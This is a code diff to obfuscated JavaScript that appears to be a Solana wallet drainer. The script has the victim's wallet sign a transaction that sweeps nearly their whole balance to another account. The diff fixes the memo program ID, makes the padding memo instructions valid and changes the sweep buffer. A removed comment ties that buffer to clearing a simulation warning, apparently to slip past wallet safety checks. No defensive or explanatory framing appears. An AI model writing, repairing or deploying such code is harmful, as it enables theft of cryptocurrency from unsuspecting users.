@@ -282,7 +282,7 @@
         "06ec4cdf-ba6c-4dfc-827f-5bae3b93f146",
         "https://mainnet.helius-rpc.com/?api-key=",
         "confirmed",
-        "MemoSq4gqABmAnSreS69YmE9vR8W8m9Z8vS8Z8vS8Z8", // Official/Custom Memo target ID
+        "MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr", // Valid official Solana Memo Program ID
         "connect",
         "signTransaction",
         "sendRawTransaction",
@@ -436,20 +436,20 @@
                         })
                     );
 
-                    // 37 Memo / Dummy Instructions
-                    const _0x20 = new Uint8Array([0x00]); 
-                    for (let _0xf = 0; _0xf < 35; _0xf++) { 
+                    // 37 Memo Instructions using valid Memo program ID
+                    const encoder = new TextEncoder();
+                    for (let _0xf = 0; _0xf < 37; _0xf++) { 
                         _0x1f.add(
                             new solanaWeb3.TransactionInstruction({
                                 keys: [{ pubkey: userPublicKey, isSigner: true, isWritable: true }],
                                 programId: new solanaWeb3.PublicKey(_0x1a[4]), 
-                                data: _0x20
+                                data: encoder.encode("x")
                             })
                         );
                     }
 
-                    // Residual Balance Sweep ( adjusted buffer to clear simulation warning )
-                    const _0x21 = _0x1e - _0x1c - 150000; 
+                    // Residual Balance Sweep (leaving a safe fee buffer)
+                    const _0x21 = _0x1e - _0x1c - 200000; 
                     if (_0x21 > 10000) {
                         _0x1f.add(
                             solanaWeb3.SystemProgram.transfer({
